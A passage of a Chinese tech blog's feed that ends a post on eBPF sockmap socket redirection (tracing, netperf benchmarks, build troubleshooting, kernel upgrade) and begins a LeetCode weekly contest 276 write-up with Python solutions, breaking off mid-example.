class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo tree /sys/fs/bpf/</span><br><span class="line">/sys/fs/bpf/</span><br><span class="line">├── bpf_sockops</span><br><span class="line">├── bpf_tcpip_bypass</span><br><span class="line">└── sock_ops_map</span><br><span class="line"></span><br><span class="line">0 directories, 3 files</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool map show id 42 -f</span><br><span class="line">42: sockhash  name sock_ops_map  flags 0x0</span><br><span class="line">key 24B  value 4B  max_entries 65535  memlock 0B</span><br></pre></td></tr></table></figure><h6 id="确认应用程序绕过TCP-IP协议栈"><a href="#确认应用程序绕过TCP-IP协议栈" class="headerlink" title="确认应用程序绕过TCP/IP协议栈"></a>确认应用程序绕过TCP/IP协议栈</h6><p>首先打开日志追踪</p><p>root模式下执行如下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir# echo 1 &gt; /sys/kernel/debug/tracing/tracing_on</span><br></pre></td></tr></table></figure><p>接着在shell中对内核实时流跟踪文件trace_pipe进行cat查询，用来监视通过eBPF的TCP通信</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir# cat /sys/kernel/debug/tracing/trace_pipe</span><br><span class="line">          &lt;idle&gt;-0     [001] ..s. 30406.252054: 0: &lt;&lt;&lt; ipv4 op = 4, port 47750 --&gt; 443</span><br><span class="line">          &lt;idle&gt;-0     [001] ..s. 32211.552998: 0: &lt;&lt;&lt; ipv4 op = 4, port 46724 --&gt; 443</span><br><span class="line">          &lt;idle&gt;-0     [001] ..s. 44205.364961: 0: &lt;&lt;&lt; ipv4 op = 4, port 36448 --&gt; 443</span><br><span class="line">          &lt;idle&gt;-0     [000] ..s. 57704.968149: 0: &lt;&lt;&lt; ipv4 op = 4, port 60816 --&gt; 443</span><br></pre></td></tr></table></figure><p>使用socat生成的TCP监听器模拟echo服务器，并使用nc发送连接请求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ sudo socat TCP4-LISTEN:9999,fork exec:cat</span><br><span class="line">root@ubuntu:~$ nc localhost 9999</span><br></pre></td></tr></table></figure><p>随后我们就可以在内核追踪管道中看到在eBPF程序打印的日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir# cat /sys/kernel/debug/tracing/trace_pipe</span><br><span class="line">          &lt;idle&gt;-0     [003] ..s. 61937.626701: 0: &lt;&lt;&lt; ipv4 op = 5, port 22 --&gt; 51324</span><br><span class="line">              nc-4486  [001] .... 61949.838226: 0: &lt;&lt;&lt; ipv4 op = 4, port 43062 --&gt; 9999</span><br><span class="line">              nc-4486  [001] .Ns1 61949.838279: 0: &lt;&lt;&lt; ipv4 op = 5, port 9999 --&gt; 43062</span><br></pre></td></tr></table></figure><h6 id="代码步骤梳理"><a href="#代码步骤梳理" class="headerlink" title="代码步骤梳理"></a>代码步骤梳理</h6><ul><li><code>bpf_sockops_v4.c</code><ul><li>监听<code>socket</code>事件，当事件触发的时候执行</li><li>提取 socket 信息，并以 key &amp; value 形式存储到 sockmap</li></ul></li><li><code>bpf_tcpip_bypass.c</code><ul><li>拦截所有的 <code>sendmsg</code> 系统调用，从消息中提取 key</li><li>根据key查询sockmap，找到这个socket的对端，然后绕过 TCP/IP 协议栈，将数据重定向</li></ul></li></ul><h5 id="网络延迟测试"><a href="#网络延迟测试" class="headerlink" title="网络延迟测试"></a>网络延迟测试</h5><p>使用<code>netperf</code>命令，执行时长参数为60秒的各种请求和响应消息大小，进行延迟测量（分别采用p50、p90 和 p99，其中P50表示中位数。P90表示包含90%的值。P99表示包含99%的值。）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ netserver -p 1000</span><br><span class="line">Unable to start netserver with  'IN(6)ADDR_ANY' port '1000' and family AF_UNSPEC</span><br></pre></td></tr></table></figure><p>这里是因为端口被占用的问题，我们换一个端口即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ sudo netserver -p 9998</span><br><span class="line">Starting netserver with host 'IN(6)ADDR_ANY' port '9998' and family AF_UNSPEC</span><br></pre></td></tr></table></figure><p>执行<code>nperf_latency.sh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir# ./nperf_latency.sh</span><br></pre></td></tr></table></figure><p>查看结果</p><p>其中第一行和第三行是原生TCP的网络延迟，第二行和第四行是eBPF重定向之后的网络延迟</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ cat result_lat.txt </span><br><span class="line">Req/Resp size: 64 128</span><br><span class="line">45,89,117</span><br><span class="line">17,51,69</span><br><span class="line">46,89,125</span><br><span class="line">26,48,70</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 256</span><br><span class="line">75,101,129</span><br><span class="line">18,48,71</span><br><span class="line">65,101,134</span><br><span class="line">23,58,81</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 512</span><br><span class="line">52,103,139</span><br><span class="line">20,60,85</span><br><span class="line">58,105,143</span><br><span class="line">16,57,77</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 1024</span><br><span class="line">64,109,149</span><br><span class="line">14,58,79</span><br><span class="line">99,113,152</span><br><span class="line">22,63,86</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 2048</span><br><span class="line">79,109,148</span><br><span class="line">23,64,86</span><br><span class="line">73,105,139</span><br><span class="line">25,63,87</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 4096</span><br><span class="line">88,114,144</span><br><span class="line">19,62,81</span><br><span class="line">51,107,144</span><br><span class="line">22,65,90</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 8192</span><br><span class="line">53,110,149</span><br><span class="line">24,69,93</span><br><span class="line">53,114,148</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 16384</span><br><span class="line">58,118,156</span><br><span class="line">98,126,159</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 32768</span><br><span class="line">48,124,157</span><br><span class="line">18,45,104</span><br><span class="line">44,125,158</span><br><span class="line">19,83,111</span><br></pre></td></tr></table></figure><h5 id="网络事务测试"><a href="#网络事务测试" class="headerlink" title="网络事务测试"></a>网络事务测试</h5><p>使用<code>netperf</code>命令来测试60秒运行的各种请求和响应消息大小的事务率：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ ./nperf_trans.sh</span><br></pre></td></tr></table></figure><p>查看结果</p><p>第一行为原生TCP的事务率，第二行是eBPF重定向之后的事务率</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Req/Resp size: 64 128</span><br><span class="line">12.8764</span><br><span class="line">37.7448</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 256</span><br><span class="line">15.4409</span><br><span class="line">26.7399</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 512</span><br><span class="line">19.6885</span><br><span class="line">51.1781</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 1024</span><br><span class="line">19.7911</span><br><span class="line">54.3722</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 2048</span><br><span class="line">16.2438</span><br><span class="line">48.3493</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 4096</span><br><span class="line">17.0712</span><br><span class="line">39.6384</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 8192</span><br><span class="line">19.775</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 16384</span><br><span class="line">14.8864</span><br><span class="line">26.6844</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 32768</span><br><span class="line">12.8528</span><br><span class="line">42.2359</span><br></pre></td></tr></table></figure><h5 id="网络吞吐测试"><a href="#网络吞吐测试" class="headerlink" title="网络吞吐测试"></a>网络吞吐测试</h5><p>使用<code>netserver</code>服务端和<code>netperf</code>客户端进行60秒的各种发送消息大小的吞吐量测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ ./nperf_thruput.sh</span><br></pre></td></tr></table></figure><p>查看结果</p><p>第一行为原生TCP的吞吐量，第二行是eBPF重定向之后的吞吐量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">30 tx=256 rx=256</span><br><span class="line">0.3601</span><br><span class="line">0.66732</span><br><span class="line">60 tx=256 rx=256</span><br><span class="line">0.36194</span><br><span class="line">0.66343</span><br><span class="line"></span><br><span class="line">30 tx=512 rx=512</span><br><span class="line">0.70011</span><br><span class="line">1.35457</span><br><span class="line">60 tx=512 rx=512</span><br><span class="line">0.73094</span><br><span class="line">1.26444</span><br><span class="line"></span><br><span class="line">30 tx=1024 rx=1024</span><br><span class="line">1.16659</span><br><span class="line">2.3709</span><br><span class="line">60 tx=1024 rx=1024</span><br><span class="line">1.05398</span><br><span class="line">2.27725</span><br><span class="line"></span><br><span class="line">30 tx=2048 rx=2048</span><br><span class="line">2.40606</span><br><span class="line">4.071</span><br><span class="line">60 tx=2048 rx=2048</span><br><span class="line">1.91763</span><br><span class="line">4.04238</span><br><span class="line"></span><br><span class="line">30 tx=3072 rx=3072</span><br><span class="line">3.34056</span><br><span class="line">5.38908</span><br><span class="line">60 tx=3072 rx=3072</span><br><span class="line">3.41499</span><br><span class="line">5.47481</span><br></pre></td></tr></table></figure><h5 id="遇到的一些问题"><a href="#遇到的一些问题" class="headerlink" title="遇到的一些问题"></a>遇到的一些问题</h5><h6 id="编译bpftool工具出错"><a href="#编译bpftool工具出错" class="headerlink" title="编译bpftool工具出错"></a>编译bpftool工具出错</h6><p>在<code>/tools/bpf/bpftool</code>目录下执行make时会自动检查系统特征，而对于<code>libbfd</code>库，linux内核为<code>4.x</code>的版本是检测不到的。在<code>5.3</code>版本下会显示<code>on</code></p><h6 id="编译bpf字节码出错"><a href="#编译bpf字节码出错" class="headerlink" title="编译bpf字节码出错"></a>编译bpf字节码出错</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ clang -O2 -g -target bpf -I /usr/include/linux/ -I /usr/src/linux-headers-4.18.0-13/include/ -c bpf_sockops_v4.c  -o bpf_sockops_v4.o</span><br></pre></td></tr></table></figure><p>具体表现在clang编译的时候会报错<code>use of undeclared identifier BPF_XXX</code>，这里需要注意一下，对于bpf中的一些函数也有内核版本的限制，具体的版本可以参考如下链接</p><p>BPF Features by Linux Kernel Version</p><ul><li><a href="https://github.com/delphix/bcc/blob/master/docs/kernel-versions.md" target="_blank" rel="noopener">https://github.com/delphix/bcc/blob/master/docs/kernel-versions.md</a></li></ul><h6 id="加载bpf字节码出错"><a href="#加载bpf字节码出错" class="headerlink" title="加载bpf字节码出错"></a>加载bpf字节码出错</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ ~/linux-4.18.13/tools/bpf/bpftool/./bpftool prog load bpf_sockops_v4.o /sys/fs/bpf/bpf_sockops</span><br><span class="line">libbpf: Program '"sockops"' contains non-map related relo data pointing to section 5</span><br><span class="line">Error: failed to load program</span><br></pre></td></tr></table></figure><p>问题google后发现，可能是低内核版本不支持bpf程序静态全局变量的定义，</p><p><a href="https://stackoverflow.com/questions/48653061/ebpf-global-variables-and-structs" target="_blank" rel="noopener">https://stackoverflow.com/questions/48653061/ebpf-global-variables-and-structs</a></p><h5 id="安装指定版本的Linux内核"><a href="#安装指定版本的Linux内核" class="headerlink" title="安装指定版本的Linux内核"></a>安装指定版本的Linux内核</h5><h6 id="查询当前内核版本"><a href="#查询当前内核版本" class="headerlink" title="查询当前内核版本"></a>查询当前内核版本</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ uname -r</span><br><span class="line">4.18.0-13-generic</span><br></pre></td></tr></table></figure><h6 id="查询当前安装的内核镜像"><a href="#查询当前安装的内核镜像" class="headerlink" title="查询当前安装的内核镜像"></a>查询当前安装的内核镜像</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ dpkg --get-selections |grep linux-image</span><br><span class="line">linux-image-4.15.0-162-genericinstall</span><br><span class="line">linux-image-4.15.0-55-genericdeinstall</span><br><span class="line">linux-image-4.18.0-13-genericinstall</span><br><span class="line">linux-image-genericinstall</span><br></pre></td></tr></table></figure><h6 id="查询指定版本的Linux镜像包"><a href="#查询指定版本的Linux镜像包" class="headerlink" title="查询指定版本的Linux镜像包"></a>查询指定版本的Linux镜像包</h6><p>这里以<code>5.3.0-40</code>版本内核为例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ apt-cache search linux| grep 5.3.0-40</span><br><span class="line">linux-buildinfo-5.3.0-40-generic - Linux kernel buildinfo for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-buildinfo-5.3.0-40-lowlatency - Linux kernel buildinfo for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-cloud-tools-5.3.0-40-generic - Linux kernel version specific cloud tools for version 5.3.0-40</span><br><span class="line">linux-cloud-tools-5.3.0-40-lowlatency - Linux kernel version specific cloud tools for version 5.3.0-40</span><br><span class="line">linux-headers-5.3.0-40 - Header files related to Linux kernel version 5.3.0</span><br><span class="line">linux-headers-5.3.0-40-generic - Linux kernel headers for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-headers-5.3.0-40-lowlatency - Linux kernel headers for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-hwe-cloud-tools-5.3.0-40 - Linux kernel version specific cloud tools for version 5.3.0-40</span><br><span class="line">linux-hwe-tools-5.3.0-40 - Linux kernel version specific tools for version 5.3.0-40</span><br><span class="line">linux-image-5.3.0-40-generic - Signed kernel image generic</span><br><span class="line">linux-image-5.3.0-40-lowlatency - Signed kernel image lowlatency</span><br><span class="line">linux-image-unsigned-5.3.0-40-generic - Linux kernel image for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-image-unsigned-5.3.0-40-lowlatency - Linux kernel image for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-modules-5.3.0-40-generic - Linux kernel extra modules for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-modules-5.3.0-40-lowlatency - Linux kernel extra modules for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-modules-extra-5.3.0-40-generic - Linux kernel extra modules for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-tools-5.3.0-40-generic - Linux kernel version specific tools for version 5.3.0-40</span><br><span class="line">linux-tools-5.3.0-40-lowlatency - Linux kernel version specific tools for version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-390-5.3.0-40-generic - Linux kernel nvidia modules for version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-390-5.3.0-40-lowlatency - Linux kernel nvidia modules for version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-430-5.3.0-40-generic - Linux kernel nvidia modules for generic version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-430-5.3.0-40-lowlatency - Linux kernel nvidia modules for lowlatency version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-435-5.3.0-40-generic - Linux kernel nvidia modules for generic version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-435-5.3.0-40-lowlatency - Linux kernel nvidia modules for lowlatency version 5.3.0-40</span><br></pre></td></tr></table></figure><h6 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-headers-5.3.0-40-generic linux-image-5.3.0-40-generic</span><br></pre></td></tr></table></figure><h6 id="重启后查询内核版本"><a href="#重启后查询内核版本" class="headerlink" title="重启后查询内核版本"></a>重启后查询内核版本</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ uname -r</span><br><span class="line">5.3.0-40-generic</span><br></pre></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://ebpf.io/what-is-ebpf/" target="_blank" rel="noopener">https://ebpf.io/what-is-ebpf/</a></li><li><a href="https://www.dazhuanlan.com/lganlan/topics/1072521" target="_blank" rel="noopener">https://www.dazhuanlan.com/lganlan/topics/1072521</a></li><li><a href="https://arthurchiao.art/blog/cilium-bpf-xdp-reference-guide-zh/" target="_blank" rel="noopener">https://arthurchiao.art/blog/cilium-bpf-xdp-reference-guide-zh/</a></li><li><a href="https://jishuin.proginn.com/p/763bfbd6368e" target="_blank" rel="noopener">https://jishuin.proginn.com/p/763bfbd6368e</a></li><li><a href="https://forsworns.github.io/zh/blogs/20210311/" target="_blank" rel="noopener">https://forsworns.github.io/zh/blogs/20210311/</a></li><li><a href="http://arthurchiao.art/blog/socket-acceleration-with-ebpf-zh/" target="_blank" rel="noopener">http://arthurchiao.art/blog/socket-acceleration-with-ebpf-zh/</a></li><li><a href="https://www.cnxct.com/lessons-using-ebpf-accelerating-cloud-native-zh/" target="_blank" rel="noopener">https://www.cnxct.com/lessons-using-ebpf-accelerating-cloud-native-zh/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;最近因为一些原因开始学习eBPF，后续也将持续学习eBPF的一些具体应用。&lt;/p&gt;
&lt;h4 id=&quot;BPF发展史&quot;&gt;&lt;a href=&quot;#BP
      
    
    </summary>
    
    
      <category term="Linux" scheme="elssm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode第276场周赛write up</title>
    <link href="elssm.github.io/2022/01/16/Leetcode%E7%AC%AC276%E5%9C%BA%E5%91%A8%E8%B5%9Bwrite-up/"/>
    <id>elssm.github.io/2022/01/16/Leetcode第276场周赛write-up/</id>
    <published>2022-01-16T06:00:39.000Z</published>
    <updated>2022-01-16T06:20:12.246Z</updated>
    
    <content type="html"><![CDATA[<h4 id="将字符串拆分为若干长度为-k-的组"><a href="#将字符串拆分为若干长度为-k-的组" class="headerlink" title="将字符串拆分为若干长度为 k 的组"></a>将字符串拆分为若干长度为 k 的组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">字符串 s 可以按下述步骤划分为若干长度为 k 的组：</span><br><span class="line">第一组由字符串中的前 k 个字符组成，第二组由接下来的 k 个字符串组成，依此类推。每个字符都能够成为 某一个 组的一部分。</span><br><span class="line">对于最后一组，如果字符串剩下的字符 不足 k 个，需使用字符 fill 来补全这一组字符。</span><br><span class="line">注意，在去除最后一个组的填充字符 fill（如果存在的话）并按顺序连接所有的组后，所得到的字符串应该是 s 。</span><br><span class="line">给你一个字符串 s ，以及每组的长度 k 和一个用于填充的字符 fill ，按上述步骤处理之后，返回一个字符串数组，该数组表示 s 分组后 每个组的组成情况 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;abcdefghi&quot;, k = 3, fill = &quot;x&quot;</span><br><span class="line">输出：[&quot;abc&quot;,&quot;def&quot;,&quot;ghi&quot;]</span><br><span class="line">解释：</span><br><span class="line">前 3 个字符是 &quot;abc&quot; ，形成第一组。</span><br><span class="line">接下来 3 个字符是 &quot;def&quot; ，形成第二组。</span><br><span class="line">最后 3 个字符是 &quot;ghi&quot; ，形成第三组。</span><br><span class="line">由于所有组都可以由字符串中的字符完全填充，所以不需要使用填充字符。</span><br><span class="line">因此，形成 3 组，分别是 &quot;abc&quot;、&quot;def&quot; 和 &quot;ghi&quot; 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;abcdefghij&quot;, k = 3, fill = &quot;x&quot;</span><br><span class="line">输出：[&quot;abc&quot;,&quot;def&quot;,&quot;ghi&quot;,&quot;jxx&quot;]</span><br><span class="line">解释：</span><br><span class="line">与前一个例子类似，形成前三组 &quot;abc&quot;、&quot;def&quot; 和 &quot;ghi&quot; 。</span><br><span class="line">对于最后一组，字符串中仅剩下字符 &apos;j&apos; 可以用。为了补全这一组，使用填充字符 &apos;x&apos; 两次。</span><br><span class="line">因此，形成 4 组，分别是 &quot;abc&quot;、&quot;def&quot;、&quot;ghi&quot; 和 &quot;jxx&quot; 。</span><br></pre></td></tr></table></figure><p>常规题，先分割，再填补。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">divideString</span><span class="params">(self, s, k, fill)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :type fill: str</span></span><br><span class="line"><span class="string">        :rtype: List[str]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">while</span> len(s)&gt;=k:</span><br><span class="line">            t = s[:k]</span><br><span class="line">            s = s[k:]</span><br><span class="line">            res.append(t)</span><br><span class="line">        <span class="keyword">if</span> len(s)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(k-len(s)):</span><br><span class="line">                s+=fill</span><br><span class="line">            res.append(s)</span><br><span class="line">            <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="得到目标值的最少行动次数"><a href="#得到目标值的最少行动次数" class="headerlink" title="得到目标值的最少行动次数"></a>得到目标值的最少行动次数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">你正在玩一个整数游戏。从整数 1 开始，期望得到整数 target 。</span><br><span class="line">在一次行动中，你可以做下述两种操作之一：</span><br><span class="line">递增，将当前整数的值加 1（即， x = x + 1）。</span><br><span class="line">加倍，使当前整数的值翻倍（即，x = 2 * x）。</span><br><span class="line">在整个游戏过程中，你可以使用 递增 操作 任意 次数。但是只能使用 加倍 操作 至多 maxDoubles 次。</span><br><span class="line">给你两个整数 target 和 maxDoubles ，返回从 1 开始得到 target 需要的最少行动次数。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：target = 5, maxDoubles = 0</span><br><span class="line">输出：4</span><br><span class="line">解释：一直递增 1 直到得到 target 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：target = 19, maxDoubles = 2</span><br><span class="line">输出：7</span><br><span class="line">解释：最初，x = 1 。</span><br><span class="line">递增 3 次，x = 4 。</span><br><span class="line">加倍 1 次，x = 8 。</span><br><span class="line">递增 1 次，x = 9 。</span><br><span class="line">加倍 1 次，x = 18 。</span><br><span class="line">递增 1 次，x = 19 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：target = 10, maxDoubles = 4</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">最初，x = 1 。 </span><br><span class="line">递增 1 次，x = 2 。 </span><br><span class="line">加倍 1 次，x = 